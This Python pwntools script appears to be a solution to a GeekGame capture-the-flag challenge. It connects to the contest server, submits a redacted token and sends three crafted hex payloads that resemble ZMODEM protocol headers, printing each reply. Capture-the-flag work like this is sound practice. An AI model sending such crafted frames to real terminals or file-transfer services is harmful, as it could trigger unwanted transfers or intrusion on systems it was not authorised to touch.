from pwn import *
import time


c = remote("prob05.geekgame.pku.edu.cn", 10005)
c.recvuntil(b"Please input your token: ")
c.sendline(b"13:...")  # token deleted

def send(pad):
	c.sendline(pad)
	print(c.recv(512))
	time.sleep(0.5)

print(c.recv(512))

send(bytes.fromhex('2a2a184230313030303030303633663639340a'))

send(bytes.fromhex('2a2a184230313030303030303633663639340a0a'))
send(bytes.fromhex('2a2a184230393030303030303030613837630a0a'))

print(c.recv(2048))

c.close()
